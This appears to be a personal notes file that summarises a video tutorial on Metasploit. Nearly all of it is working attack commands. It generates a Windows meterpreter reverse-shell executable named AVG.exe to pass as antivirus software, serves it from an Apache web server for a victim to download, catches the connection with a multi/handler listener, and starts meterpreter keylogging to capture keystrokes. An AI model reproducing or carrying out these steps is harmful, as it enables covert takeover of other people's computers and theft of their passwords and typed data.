# Requires kali built in metasploit framework

## https://www.youtube.com/watch?v=g77XXAKc9qA

This seems like interesting project to do.
Simple enough to do it

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f exe > /root/Desktop/AVG.exe

Move the file to /var/www/html
cd into /var/www/html
service apache2 start

to download the file from same network computer,
IP address/filename

Then start metasploit framework console
  > msfconsole

He mentioned there are many different exploitation method (Will have to research on this)
In this project he used multi handler
  > use exploit/multi/handler

Specify payload
  > set payload windows/meterpreter/reverse_tcp

Provide current IP to allow communication between the two
  > set LHOST {IP}

get the other machine to install and type
  > exploit

allows keylogging
  > keyscan_start
  > keyscan_stop
  > keyscan_dump
